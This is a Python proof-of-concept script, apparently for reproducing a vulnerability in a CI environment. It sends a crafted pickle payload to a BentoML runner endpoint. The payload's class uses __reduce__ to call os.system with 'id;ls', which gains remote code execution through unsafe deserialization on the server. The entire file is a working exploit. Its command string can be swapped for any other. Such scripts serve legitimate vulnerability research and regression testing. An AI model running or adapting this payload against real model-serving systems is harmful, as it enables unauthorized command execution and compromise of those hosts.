import requests
import pickle
import sys

IS_CI_RUN = sys.argv[1] if len(sys.argv) > 1 else "false"

if IS_CI_RUN == "true":
    url = "http://bentoml-runner:3001/"
else:
    url = "http://0.0.0.0:3001/"

headers = {
    "args-number": "3",
    "Content-Type": "application/vnd.bentoml.pickled",
}

class SimpleModel:
    def __reduce__(self):
        return  (__import__('os').system, ("id;ls",))
data = pickle.dumps(SimpleModel())

try:
    # Set a timeout for the POST request (10 seconds)
    response = requests.post(url, headers=headers, data=data, timeout=10)
    print(response.text)
except requests.exceptions.Timeout:
    print("Request timed out. Terminating script.")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
finally:
    exit()

